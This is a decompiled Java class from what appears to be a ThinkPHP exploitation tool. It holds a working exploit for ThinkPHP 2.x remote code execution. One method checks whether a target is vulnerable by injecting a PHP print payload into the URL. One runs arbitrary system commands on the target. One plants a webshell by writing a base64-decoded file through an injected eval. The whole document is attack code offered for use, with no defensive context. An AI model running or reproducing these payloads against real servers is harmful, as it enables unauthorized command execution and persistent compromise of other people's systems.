/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public class tp2_lite_code_exec
/*    */   implements BaseExp
/*    */ {
/* 30 */   private String results = null;
/* 31 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 35 */     url = url + "/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D";
/* 36 */     Response response = HttpTool.get(url, this.property);
/* 37 */     if (response.getText().contains("56540676a129760a3")) {
/* 38 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 39 */       return this.results;
/*    */     } 
/* 41 */     if (response.getError() != null) {
/* 42 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 43 */       return this.results;
/*    */     } 
/* 45 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/*    */     
/* 47 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 52 */     url = url + "/index.php/module/action/param1/$%7B@print%28system%28" + cmd + "%29%29%7D";
/* 53 */     Response response = HttpTool.get(url, this.property);
/* 54 */     if (response.getError() == null) {
/* 55 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 57 */       this.results = response.getError();
/*    */     } 
/* 59 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 65 */       String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/* 66 */       content = URLEncoder.encode(base64Content, "UTF-8");
/* 67 */       String payload = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('" + fileName + "',base64_decode('" + content + "'));";
/* 68 */       Response response = HttpTool.get(url + payload, this.property);
/* 69 */       if (response.getError() == null) {
/* 70 */         response = HttpTool.get(url + "/" + fileName, this.property);
/* 71 */         if (response.getCode() == 200) {
/* 72 */           this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 73 */           return this.results;
/*    */         } 
/*    */       } else {
/* 76 */         this.results = "[-] 上传失败: " + response.getError();
/*    */       } 
/* 78 */     } catch (Exception e) {
/* 79 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 81 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp2_lite_code_exec.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */